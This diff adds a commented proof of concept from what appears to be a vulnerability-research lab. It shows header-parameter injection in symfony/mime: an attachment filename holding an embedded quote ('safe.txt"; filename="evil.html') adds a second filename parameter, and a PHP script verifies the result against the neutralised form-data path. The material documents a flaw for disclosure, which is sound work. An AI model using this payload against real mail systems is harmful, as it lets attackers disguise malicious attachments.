@@ -1,0 +1,56 @@
+# VULN-002 — component-level PoC (symfony/mime is a library; no HTTP route, and
+# the lab has no egulias/email-validator so Email/Address cannot be built).
+# The 'request' is the attacker-controlled attachment filename rendered into a
+# DataPart (exactly what Email::attach() builds). Reproduce with:
+#
+#   docker exec -i cvehunterlab_symfony_app php <<'PHP'
+#   <?php
+#   require '/app/vendor/autoload.php';
+#   
+#   use Symfony\Component\Mime\Part\DataPart;
+#   use Symfony\Component\Mime\Header\ParameterizedHeader;
+#   
+#   // Attacker-controlled attachment filename: the embedded `"` closes the quoted value and
+#   // injects a second `filename=` parameter into the same header.
+#   $payload = 'safe.txt"; filename="evil.html';
+#   
+#   // (A) REAL email-attachment path. DataPart is exactly what Email::attach() constructs
+#   //     (disposition 'attachment'); getPreparedHeaders() renders through ParameterizedHeader.
+#   $part = new DataPart('ATTACHMENT-BYTES', $payload, 'text/plain');
+#   $raw = $part->getPreparedHeaders()->toString();
+#   
+#   // Unfold RFC 5322 header folding (CRLF + WSP -> single space) to get logical header lines.
+#   $unfolded = preg_replace('/\r\n[ \t]+/', ' ', $raw);
+#   $lines = explode("\r\n", $unfolded);
+#   $cdisp = '';
+#   $ctype = '';
+#   foreach ($lines as $l) {
+#       if (stripos($l, 'Content-Disposition:') === 0) {
+#           $cdisp = $l;
+#       } elseif (stripos($l, 'Content-Type:') === 0) {
+#           $ctype = $l;
+#       }
+#   }
+#   
+#   $filenameCount          = substr_count($cdisp, 'filename=');
+#   $injectedParamPresent   = (false !== strpos($cdisp, 'filename="evil.html"')) ? 1 : 0;
+#   $cdispHasBackslashQuote = (false !== strpos($cdisp, '\\"')) ? 1 : 0;   // what a FIX would emit
+#   
+#   // (B) CONTRAST — the SAME ParameterizedHeader class on a multipart/form-data disposition
+#   //     DOES neutralise the `"` (WHATWG path at :127-134 replaces it with %22).
+#   $form = new ParameterizedHeader('Content-Disposition', 'form-data', ['filename' => $payload]);
+#   $formRaw = preg_replace('/\r\n[ \t]+/', ' ', $form->toString());
+#   $formInjected = (false !== strpos($formRaw, 'filename="evil.html"')) ? 1 : 0;   // expect 0
+#   $formPct22    = (false !== strpos($formRaw, '%22')) ? 1 : 0;                      // expect 1
+#   
+#   echo 'PAYLOAD::', $payload, "\n";
+#   echo 'CDISP::', $cdisp, "\n";
+#   echo 'CTYPE::', $ctype, "\n";
+#   echo 'FORM_DATA_HEADER::', $formRaw, "\n";
+#   echo 'FILENAME_COUNT::', $filenameCount, "\n";
+#   echo 'INJECTED_PARAM_PRESENT::', $injectedParamPresent, "\n";
+#   echo 'CDISP_HAS_BACKSLASH_QUOTE::', $cdispHasBackslashQuote, "\n";
+#   echo 'FORMDATA_INJECTED::', $formInjected, "\n";
+#   echo 'FORMDATA_PCT22::', $formPct22, "\n";
+#   echo 'RAW_B64::', base64_encode($raw), "\n";
+#   PHP
